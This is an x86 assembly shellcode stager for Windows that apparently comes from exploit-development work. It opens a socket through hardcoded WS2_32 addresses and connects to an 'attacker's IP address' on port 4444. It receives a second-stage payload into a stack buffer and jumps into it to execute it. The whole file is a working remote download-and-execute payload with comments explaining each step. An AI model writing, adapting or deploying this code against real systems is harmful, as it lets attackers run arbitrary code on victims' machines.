[BITS 32]

; Execute WSAStartup

XOR EBX,EBX         	; Zero EBX
MOV BX,0x0190       	; Set lower bytes to 0x0190
SUB ESP,EBX         	; Subtract EBX from ESP
PUSH ESP            	; Push ESP for lsWSAData
PUSH EBX            	; Push EBX for wVersion Requested
MOV EBX,0x71AB6A55  	; MOV EAX,WS2_32.WSAStartUp
CALL EBX            	; Call WSAStartUp

; Setup a new socket using WSASocketA
; If no error occurs, WSASocketA returns a descriptor

XOR EDI,EDI 					; Set EDI to NULL
PUSH EDI							; Push dwFlags arg — 0 means no flags
PUSH EDI							; Push g arg — 0 means no group operation
PUSH EDI							; Push lpProtocolInfo arg — NULL
PUSH EDI							; Push the protocol arg — 0 means no protocol specified
INC EDI								; Increment EDI to 1
PUSH EDI							; Push the type argument as 1 (SOCK_STREAM)
INC EDI								; Increment EDI to 2
PUSH EDI							; Push af argument as 2 (AF_NET)
MOV EBX,0x71AB8B6A  	; MOV EAX,WS2_32.WSASocketA
CALL EBX							; CALL WSASocketA

; DEBUG

; MOV EBX,0x71AB3CCE	; MOV EAX,WS2_32.WSAGetLastError
; CALL EBX            ; CALL WSAGetLastError

; DEBUG

MOV EDI,EAX 					; Save socket descriptor in EDI

; Initiate a connection with connect()

PUSH 0x84C1A8C0				; Push attacker’s IP address — 192.168.193.132
MOV EAX,0x5C110102		; Mov the port and address family attributes -- default port is 4444
DEC AH								; Fix the address family attribute — make it 0x5c110002
PUSH EAX 							; Push port and family to stack
MOV EDX,ESP 					; Save the pointer to the stack in EDX
XOR EAX,EAX 					; Zero EAX
MOV AL,0x10 					; Set the low byte of EAX to 0x10 which is the size of struct sockaddr
PUSH EAX 							; Push the namelen argument as 0x10
PUSH EDX 							; Push the name argument as the pointer to the struct sockaddr in on the stack
PUSH EDI 							; Push the socket descriptor returned from WSASocketA
MOV EBX,0x71AB4A07  	; MOV EAX,WS2_32.connect
CALL EBX							; CALL connect

; DEBUG

; MOV EBX,0x71AB3CCE  ; MOV EAX,WS2_32.WSAGetLastError
; CALL EBX            ; CALL WSAGetLastError

; DEBUG

; Use recv() to receive the new buffer of stage 2 shellcode

INC AH								; Increment EAX to 0x0100 as connect should have returned 0
INC AH								; Increment EAX to 0x1000 for 4096
SUB ESP,EAX 					; Allocate 4096 bytes of stack space for use in the recv call
MOV EBP,ESP 					; Save the pointer to the buffer in EBP
XOR ECX,ECX 					; Zero ECX for use as the flags argument
PUSH ECX 							; Push flags arg -- 0 for no flags
PUSH EAX 							; Push len arg -- Size of the buffer for incoming shellcode, 4096
PUSH EBP 							; Push buf arg -- Pointer to output buffer
PUSH EDI 							; Push s arg -- Descriptor returned by WSASocketA
MOV EBX,0x71AB676F  	; MOV EAX,WS2_32.recv
CALL EBX 							; CALL recv

; Jump to the stage 2 shellcode and execute

JMP EBP 							; Jump into the buffer that was read.
